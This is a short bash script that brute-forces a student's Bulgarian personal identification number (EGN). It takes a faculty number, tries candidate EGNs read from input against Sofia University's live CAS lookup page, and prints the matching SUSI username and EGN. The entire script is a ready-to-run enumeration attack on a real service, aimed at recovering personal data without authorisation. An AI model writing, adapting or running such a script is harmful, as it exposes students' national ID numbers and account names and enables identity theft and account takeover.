#!/bin/bash

[ $# -eq 1 ] || { echo "Usage: $0 <fn>" >&2; exit 1; }

while read egn; do
	while :; do
	res="$(curl -s -X POST -d "fn=$1&egn=$egn" \
	  "https://cas.uni-sofia.bg/index.php" | grep 'Потребителско име в СУСИ:')"
	[ $? -ne 0 ] || break
	echo "Unexpected error while checking $egn! Retrying..." >&2
	done
	if ! echo "$res" | grep -q "не е намерено"; then
		username="$(echo "$res" | sed -E 's/.*име в СУСИ: ([^<]*)<.*/\1/')"
		echo "$1, $username -> $egn"
		exit 0
	fi
done

echo "Could not find EGN" >&2
exit 1
